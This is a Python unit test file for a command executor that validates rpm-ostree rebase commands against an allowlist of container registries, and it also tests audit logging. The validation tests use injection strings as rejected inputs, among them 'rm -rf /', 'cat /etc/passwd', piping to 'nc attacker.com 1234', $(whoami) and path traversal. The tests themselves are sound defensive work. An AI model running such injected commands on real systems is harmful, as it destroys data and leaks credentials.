#!/usr/bin/env python3
"""
Security-focused unit tests for command validation and injection prevention
"""

import unittest
from unittest.mock import Mock, patch, MagicMock
import os
import tempfile
import json

import sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

from command_executor import CommandExecutor
from history_manager import HistoryManager


class TestSecurityValidations(unittest.TestCase):
    """Test security validations and injection prevention"""
    
    def setUp(self):
        """Set up test environment"""
        self.executor = CommandExecutor()
        
    def test_validate_command_empty(self):
        """Test validation rejects empty commands"""
        is_valid, error = self.executor.validate_command([])
        self.assertFalse(is_valid)
        self.assertEqual(error, "Empty command")
        
    def test_validate_command_shell_metacharacters(self):
        """Test validation rejects shell metacharacters"""
        dangerous_commands = [
            ["rpm-ostree", "rebase", "image; rm -rf /"],
            ["rpm-ostree", "rebase", "image && cat /etc/passwd"],
            ["rpm-ostree", "rebase", "image | nc attacker.com 1234"],
            ["rpm-ostree", "rebase", "image`id`"],
            ["rpm-ostree", "rebase", "$(whoami)"],
            ["rpm-ostree", "rebase", "image > /etc/passwd"],
            ["rpm-ostree", "rebase", "image < /etc/shadow"],
            ["rpm-ostree", "rebase", "image & background_command"],
            ["rpm-ostree", "rebase", "'$(echo pwned)'"],
            ["rpm-ostree", 'rebase', '"$(echo pwned)"'],
        ]
        
        for cmd in dangerous_commands:
            is_valid, error = self.executor.validate_command(cmd)
            self.assertFalse(is_valid, f"Command should be rejected: {cmd}")
            # Some commands might be caught by URL validation first
            if "dangerous character" not in error and "allowed registry" not in error:
                self.fail(f"Unexpected error for {cmd}: {error}")
            # If caught by URL validation, that's still a valid rejection
            
    def test_validate_command_unsupported_subcommand(self):
        """Test validation rejects unsupported rpm-ostree subcommands"""
        is_valid, error = self.executor.validate_command(["rpm-ostree", "admin"])
        self.assertFalse(is_valid)
        self.assertIn("Unsupported rpm-ostree subcommand", error)
        
    def test_validate_image_url_allowed_registries(self):
        """Test image URL validation accepts only allowed registries"""
        # Valid URLs
        valid_urls = [
            "ghcr.io/ublue-os/bluefin:latest",
            "ghcr.io/ublue-os/aurora:stable",
            "ghcr.io/ublue-os/bazzite:39",
            "quay.io/fedora-ostree-desktop/silverblue:40",
            "registry.fedoraproject.org/fedora/fedora-silverblue:latest",
        ]
        
        for url in valid_urls:
            is_valid, error = self.executor._validate_image_url(url)
            self.assertTrue(is_valid, f"Valid URL rejected: {url}, error: {error}")
            
        # Invalid URLs
        invalid_urls = [
            "docker.io/malicious/image:latest",  # Unauthorized registry
            "localhost:5000/local/image:latest",  # Local registry
            "192.168.1.1/private/image:latest",   # IP address
            "ghcr.io/other-org/image:latest",     # Wrong org
            "ghcr.io/ublue-os/../../etc/passwd:latest",  # Path traversal
            "ghcr.io/ublue-os/bluefin",          # Missing tag
            "ghcr.io/ublue-os/bluefin:",         # Empty tag
            "ghcr.io/ublue-os/bluefin:../../etc",  # Bad tag
        ]
        
        for url in invalid_urls:
            is_valid, error = self.executor._validate_image_url(url)
            self.assertFalse(is_valid, f"Invalid URL accepted: {url}")
            
    def test_validate_image_url_suspicious_patterns(self):
        """Test image URL validation detects suspicious patterns"""
        suspicious_urls = [
            "ghcr.io/ublue-os/bluefin:latest; echo pwned",
            "ghcr.io/ublue-os/bluefin:latest | nc attacker.com",
            "ghcr.io/ublue-os/bluefin:latest && rm -rf /",
            "ghcr.io/ublue-os/bluefin:$(whoami)",
            "ghcr.io/ublue-os/bluefin:`id`",
            "ghcr.io/ublue-os/bluefin:latest\nrm -rf /",
            "ghcr.io/ublue-os/bluefin:latest\trm -rf /",
            "ghcr.io/ublue-os/bluefin:latest rm -rf /",
            "ghcr.io/ublue-os/../../../etc/passwd:latest",
            "ghcr.io/ublue-os//bluefin:latest",
            "ghcr.io/ublue-os/bluefin:latest\\command",
        ]
        
        for url in suspicious_urls:
            is_valid, error = self.executor._validate_image_url(url)
            self.assertFalse(is_valid, f"Suspicious URL accepted: {url}")
            # URL should be rejected either for suspicious pattern or invalid path
            # Both are valid security rejections
            if "suspicious pattern" not in error and "not allowed" not in error and "too long" not in error:
                self.fail(f"URL not properly rejected: {url}, error: {error}")
            
    def test_validate_image_url_length_limit(self):
        """Test image URL validation enforces length limit"""
        # Create a very long URL
        long_url = "ghcr.io/ublue-os/" + "a" * 500 + ":latest"
        is_valid, error = self.executor._validate_image_url(long_url)
        self.assertFalse(is_valid)
        self.assertIn("too long", error)
        
    def test_validate_image_url_allowed_paths(self):
        """Test image URL validation enforces allowed paths"""
        # Invalid paths for the registry
        invalid_paths = [
            "ghcr.io/ublue-os/malicious:latest",
            "ghcr.io/ublue-os/custom-image:latest",
            "quay.io/fedora-ostree-desktop/custom:latest",
        ]
        
        for url in invalid_paths:
            is_valid, error = self.executor._validate_image_url(url)
            self.assertFalse(is_valid, f"Invalid path accepted: {url}")
            self.assertIn("not allowed", error)
            
    def test_validate_image_url_tag_format(self):
        """Test image URL validation enforces proper tag format"""
        invalid_tags = [
            "ghcr.io/ublue-os/bluefin:${VERSION}",
            "ghcr.io/ublue-os/bluefin:v1.0;rm",
            "ghcr.io/ublue-os/bluefin:v1.0|nc",
            "ghcr.io/ublue-os/bluefin:v1.0&bg",
            "ghcr.io/ublue-os/bluefin:v1.0>file",
            "ghcr.io/ublue-os/bluefin:v1.0<input",
            "ghcr.io/ublue-os/bluefin:v1.0`cmd`",
            "ghcr.io/ublue-os/bluefin:v1.0$(cmd)",
        ]
        
        for url in invalid_tags:
            is_valid, error = self.executor._validate_image_url(url)
            self.assertFalse(is_valid, f"Invalid tag accepted: {url}")
            
    @patch('subprocess.Popen')
    def test_execute_prevents_shell_injection(self, mock_popen):
        """Test execute_with_progress doesn't allow shell injection"""
        mock_process = Mock()
        mock_process.poll.return_value = 0
        mock_process.stdout.readline.side_effect = ["test output", ""]
        mock_process.communicate.return_value = ("", "")
        mock_process.returncode = 0
        mock_popen.return_value = mock_process
        
        # Try to execute with shell metacharacters
        command = ["rpm-ostree", "rebase", "ghcr.io/ublue-os/bluefin:latest"]
        
        def progress_callback(line):
            pass
            
        success, output, error_type = self.executor.execute_with_progress(
            command, progress_callback
        )
        
        # Verify Popen was called with list, not string
        mock_popen.assert_called_once()
        args, kwargs = mock_popen.call_args
        self.assertIsInstance(args[0], list)
        self.assertEqual(args[0], command)
        # Ensure shell=True is not used
        self.assertNotIn('shell', kwargs)
        
    def test_command_validation_before_execution(self):
        """Test that commands are validated before execution in the API"""
        # This would be an integration test with the main API
        # Here we just ensure the validation method exists and works
        cmd = ["rpm-ostree", "rebase", "ghcr.io/ublue-os/bluefin:latest"]
        is_valid, error = self.executor.validate_command(cmd)
        self.assertTrue(is_valid)
        
        # Test invalid command
        cmd = ["rm", "-rf", "/"]  # Not an rpm-ostree command
        is_valid, error = self.executor.validate_command(cmd)
        self.assertFalse(is_valid)


class TestAuditLogging(unittest.TestCase):
    """Test security audit logging functionality"""
    
    def setUp(self):
        """Set up test environment"""
        # Create temporary directory for history
        self.temp_dir = tempfile.mkdtemp()
        self.patcher = patch.object(HistoryManager, '_get_data_directory', 
                                    return_value=self.temp_dir)
        self.patcher.start()
        self.history_manager = HistoryManager()
        
    def tearDown(self):
        """Clean up test environment"""
        self.patcher.stop()
        # Clean up temp directory
        import shutil
        shutil.rmtree(self.temp_dir)
        
    @patch('os.getuid')
    @patch.dict(os.environ, {'XDG_SESSION_ID': 'test-session-123'})
    def test_audit_information_captured(self, mock_getuid):
        """Test that audit information is captured in history"""
        mock_getuid.return_value = 1000
        
        self.history_manager.add_entry(
            command="rpm-ostree rebase ghcr.io/ublue-os/bluefin:latest",
            success=True,
            image_name="bluefin:latest",
            operation_type="rebase"
        )
        
        entries = self.history_manager.get_recent_entries(1)
        self.assertEqual(len(entries), 1)
        
        entry = entries[0]
        self.assertEqual(entry.user_id, 1000)
        self.assertEqual(entry.session_id, 'test-session-123')
        self.assertTrue(entry.success)
        self.assertEqual(entry.operation_type, "rebase")
        
    def test_failed_command_audit(self):
        """Test that failed commands are logged with error messages"""
        self.history_manager.add_entry(
            command="rpm-ostree rebase invalid-image",
            success=False,
            image_name="invalid-image",
            operation_type="rebase",
            error_message="Image not found in allowed registries"
        )
        
        entries = self.history_manager.get_recent_entries(1)
        self.assertEqual(len(entries), 1)
        
        entry = entries[0]
        self.assertFalse(entry.success)
        self.assertEqual(entry.error_message, "Image not found in allowed registries")
        
    def test_security_report_generation(self):
        """Test security audit report generation"""
        # Add some test entries
        for i in range(5):
            self.history_manager.add_entry(
                command=f"rpm-ostree rebase test-{i}",
                success=i % 2 == 0,  # Alternate success/failure
                image_name=f"test-{i}",
                operation_type="rebase" if i < 3 else "rollback"
            )
            
        report = self.history_manager.generate_security_report()
        
        # Verify report structure
        self.assertIn('summary', report)
        self.assertIn('user_statistics', report)
        self.assertIn('operation_statistics', report)
        self.assertIn('recent_failures', report)
        
        # Verify statistics
        self.assertEqual(report['summary']['total_commands'], 5)
        self.assertEqual(report['summary']['successful'], 3)
        self.assertEqual(report['summary']['failed'], 2)
        
        # Verify operation breakdown
        self.assertEqual(report['operation_statistics']['rebase']['total'], 3)
        self.assertEqual(report['operation_statistics']['rollback']['total'], 2)
        
    def test_history_file_permissions(self):
        """Test that history file is created with secure permissions"""
        self.history_manager.add_entry(
            command="test command",
            success=True,
            image_name="test",
            operation_type="test"
        )
        
        history_file = os.path.join(self.temp_dir, "command_history.json")
        self.assertTrue(os.path.exists(history_file))
        
        # Check file permissions (should be readable/writable by owner only)
        stat_info = os.stat(history_file)
        mode = stat_info.st_mode & 0o777
        # File should not be world or group readable
        self.assertEqual(mode & 0o077, 0)
        
    @patch('systemd.journal')
    def test_systemd_journal_logging(self, mock_journal):
        """Test that commands are logged to systemd journal"""
        mock_journal.LOG_INFO = 6
        mock_journal.LOG_WARNING = 4
        
        self.history_manager.add_entry(
            command="rpm-ostree rebase test",
            success=True,
            image_name="test",
            operation_type="rebase"
        )
        
        # Verify journal.send was called
        mock_journal.send.assert_called_once()
        call_args = mock_journal.send.call_args[0]
        self.assertIn("rebase command executed", call_args[0])
        
    @patch('syslog.syslog')
    def test_syslog_fallback(self, mock_syslog):
        """Test fallback to syslog when systemd journal not available"""
        # Make systemd import fail
        with patch.dict('sys.modules', {'systemd.journal': None}):
            self.history_manager.add_entry(
                command="rpm-ostree rebase test",
                success=False,
                image_name="test",
                operation_type="rebase",
                error_message="Test error"
            )
            
        # Verify syslog was called
        mock_syslog.assert_called()
        call_args = mock_syslog.call_args[0]
        self.assertIn("failed", call_args[1])
        self.assertIn("Test error", call_args[1])


if __name__ == '__main__':
    unittest.main()